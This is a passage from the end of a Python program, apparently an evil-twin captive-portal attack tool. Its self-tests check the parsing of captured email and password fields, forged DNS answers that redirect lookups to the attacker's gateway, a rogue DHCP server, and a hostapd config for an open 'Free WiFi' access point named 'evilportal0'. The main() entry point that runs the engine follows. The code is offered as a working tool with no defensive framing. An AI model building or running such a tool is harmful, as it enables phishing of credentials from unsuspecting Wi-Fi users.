        assert q["email"] == "test@example.com", q
        assert q["password"] == "hunter+two", q

    def t_dns():
        q = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
             b"\x07example\x03com\x00\x00\x01\x00\x01")
        r = build_dns_response(q, "192.168.69.1")
        assert r is not None and r[-4:] == socket.inet_aton("192.168.69.1")

    def t_dhcp():
        mac = b"\xaa\xbb\xcc\x00\x00\x01"
        header = (bytes([1, 1, 6, 0]) + b"\x11\x22\x33\x44" + struct.pack("!HH", 0, 0)
                  + b"\x00" * 4 + b"\x00" * 4 + b"\x00" * 8 + mac + b"\x00" * 10
                  + b"\x00" * 64 + b"\x00" * 128 + DHCP_MAGIC)
        opts = _dhcp_option(53, 1) + b"\xff"
        req = parse_dhcp_packet(header + opts)
        assert req and req["type"] == 1 and req["mac"] == "aa:bb:cc:00:00:01"
        reply = build_dhcp_reply(req, 2, "192.168.69.10", "192.168.69.1")
        assert reply[0] == 2 and socket.inet_ntoa(reply[16:20]) == "192.168.69.10"

    def t_hostapd():
        c = build_hostapd_conf("evilportal0", "Free WiFi", 6)
        assert "ssid=Free WiFi" in c and "hw_mode=g" in c and "wpa" not in c

    for n, fn in [("query parse", t_qs), ("dns response", t_dns),
                  ("dhcp roundtrip", t_dhcp), ("hostapd open config", t_hostapd)]:
        check(n, fn)

    ok = True
    for c in checks:
        print("[%s] %s%s" % ("PASS" if len(c) == 2 else "FAIL", c[0],
                             (": " + c[2]) if len(c) == 3 else ""))
        ok = ok and (len(c) == 2)
    print("%d/%d passed" % (sum(1 for c in checks if len(c) == 2), len(checks)))
    return 0 if ok else 1


def main(argv=None):
    args = build_parser().parse_args(argv)
    if args.mode == "selftest":
        return selftest()
    for attr, default in (("no_guard", False),):
        if not hasattr(args, attr):
            setattr(args, attr, default)
    eng = Engine(args)

    def _stop(sig, frame):
        eng.running = False
    signal.signal(signal.SIGTERM, _stop)
    signal.signal(signal.SIGINT, _stop)
    try:
        signal.signal(signal.SIGHUP, signal.SIG_IGN)
    except Exception:
        pass
    return eng.run()


if __name__ == "__main__":
    sys.exit(main())
